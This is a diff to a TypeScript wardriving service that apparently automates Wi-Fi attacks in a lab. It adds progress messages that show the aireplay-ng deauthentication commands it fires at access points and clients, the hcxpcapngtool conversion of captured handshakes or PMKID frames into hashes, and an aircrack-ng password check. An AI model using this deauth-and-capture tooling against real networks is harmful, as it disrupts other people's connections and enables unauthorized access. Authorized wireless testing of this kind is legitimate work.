@@ -667,15 +667,21 @@ export class WardriveService extends EventEmitter {
         }
         // If we've had 3 attempts with no clients detected, extend the wait.
         const settleMs = clients.length === 0 ? DEAUTH_SETTLE_MS * 2 : DEAUTH_SETTLE_MS;
-        this.progress(bssid, "deauth", `Intento ${attempt}/${DEAUTH_MAX_ATTEMPTS}: deauth a ${clients.length} cliente(s)...`)
-        ;
+        this.progress(bssid, "deauth", `Intento ${attempt}/${DEAUTH_MAX_ATTEMPTS}: deauth a ${clients.length} cliente(s)...`,
+          clients.length > 0
+            ? `aireplay-ng --deauth ${DEAUTH_BURST} -a ${bssid} -c ${clients[0]} -D ${this.iface}`
+            : `aireplay-ng --deauth ${DEAUTH_BURST} -a ${bssid} -D ${this.iface} (broadcast)`);
         for (const client of clients) {
           if (this.attackAbort) break;
           await this.fireDeauth(bssid, client, attempt);
         }
         if (!this.attackAbort) await this.fireDeauth(bssid, null, attempt); // broadcast too
         this.progress(bssid, "validate", `Esperando handshake de reconexión...${clients.length === 0 ? " (sin clientes detectados, esperando más tiempo)" : ""}`);
-        captured = await this.waitForCapture(bssid, capFile, settleMs);
+        // Post-capture: hcxpcapngtool conversion (turns EAPOL/PMKID frames into
+    // the .hc22000 hash and is the "captured" verdict source).
+    this.progress(bssid, "validate", "Convirtiendo captura y buscando handshake...",
+      `hcxpcapngtool -o <prefix>.hc22000 <prefix>-01.cap`);
+    captured = await this.waitForCapture(bssid, capFile, settleMs);
         if (captured) {
           this.progress(bssid, "validate", "¡Handshake capturado!");
           break;
@@ -704,7 +710,8 @@ export class WardriveService extends EventEmitter {
     // PMKID fallback: if deauth didn't produce a handshake, keep the locked
     // capture running and wait for a passive PMKID frame (WPA3/SAE networks
     // don't do 4-way handshakes but still emit PMKID on client connect).
-    this.progress(bssid, "validate", "Deauth no funcionó, intentando PMKID pasivo...");
+    this.progress(bssid, "validate", "Deauth no funcionó, intentando PMKID pasivo...",
+      "ventana pasiva sobre la captura activa (esperando PMKID de un cliente real conectándose)");
     this.appendLog(bssid, `[pmkid] passive fallback window ${PMKID_PASSIVE_MS / 1000}s`);
     this.updateMeta(bssid, { method: "pmkid" });
     captured = await this.waitForCapture(bssid, capFile, PMKID_PASSIVE_MS);
@@ -770,16 +777,20 @@ export class WardriveService extends EventEmitter {
     if (!password || !this.session) return;
     const capPath = resolveCapPath(this.session.dir, this.targetFiles(bssid));
     if (!capPath) return;
-    this.progress(bssid, "done", "Validando handshake con la contraseña del lab...");
+    this.progress(bssid, "done", "Validando handshake con la contraseña del lab...",
+      "aircrack-ng -w - -b " + bssid + " <prefix>-01.cap   (contraseña por stdin)");
     const result = await crackCheck(capPath, password, bssid);
     this.verified.set(bssid, result);
     this.appendLog(bssid, `[validate] aircrack verdict=${result.verdict}`);
     if (result.matched) {
-      this.progress(bssid, "done", "✓ Handshake VALIDADO — contraseña correcta (KEY FOUND)");
+      this.progress(bssid, "done", "✓ Handshake VALIDADO — contraseña correcta (KEY FOUND)",
+        undefined, result.output.slice(-600));
     } else if (result.verdict === "handshake_wrong_password") {
-      this.progress(bssid, "done", "Handshake completo pero la contraseña del lab no matchea");
+      this.progress(bssid, "done", "Handshake completo pero la contraseña del lab no matchea",
+        undefined, result.output.slice(-600));
     } else {
-      this.progress(bssid, "done", `Validación aircrack: ${result.verdict}`);
+      this.progress(bssid, "done", `Validación aircrack: ${result.verdict}`,
+        undefined, result.output.slice(-600));
     }
   }
 
